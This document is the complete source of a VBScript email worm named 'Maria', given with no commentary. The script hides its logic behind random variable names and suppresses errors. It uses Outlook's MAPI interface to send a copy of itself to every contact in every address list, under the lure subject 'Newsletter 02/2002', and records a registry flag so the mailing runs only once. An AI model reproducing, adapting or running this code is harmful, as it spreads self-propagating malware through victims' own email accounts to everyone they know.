'Worm Name: Maria
'Written By: AC
On Error Resume Next
haxcweqbaltbvqo = WScript.ScriptFullName
Set etwabbxhqcklmbl = CreateObject("WScript.Shell") 
If etwabbxhqcklmbl.RegRead("HKCU\Software\Maria_sent") <> "yea" Then
Set amoyqeqqdhsujgh = CreateObject("Outlook.Application")
If amoyqeqqdhsujgh <> "" Then
Set uisqtmeaagpkriq = amoyqeqqdhsujgh.GetNameSpace("MAPI")
For lbkdldhviqklsqm = 1 to uisqtmeaagpkriq.AddressLists.Count
Set nihlapugdepfymm = amoyqeqqdhsujgh.CreateItem(0)
Set kitnaxoxhahpikb = uisqtmeaagpkriq.AddressLists.Item(lbkdldhviqklsqm)
nihlapugdepfymm.Attachments.Add haxcweqbaltbvqo
nihlapugdepfymm.Subject = "Newsletter 02/2002"
nihlapugdepfymm.Body = "'Cause I love Maria!"
Set lnaykkojjxjkuoa = kitnaxoxhahpikb.AddressEntries
Set gvyyinopidvcovg = nihlapugdepfymm.Recipients
For faibygwosqwvthp = 1 to lnaykkojjxjkuoa.Count
nihlapugdepfymm.Recipients.Add lnaykkojjxjkuoa.Item(faibygwosqwvthp)
Next
nihlapugdepfymm.Send
Next
etwabbxhqcklmbl.RegWrite "HKCU\Software\Maria_sent", "yea" 
End If
End If
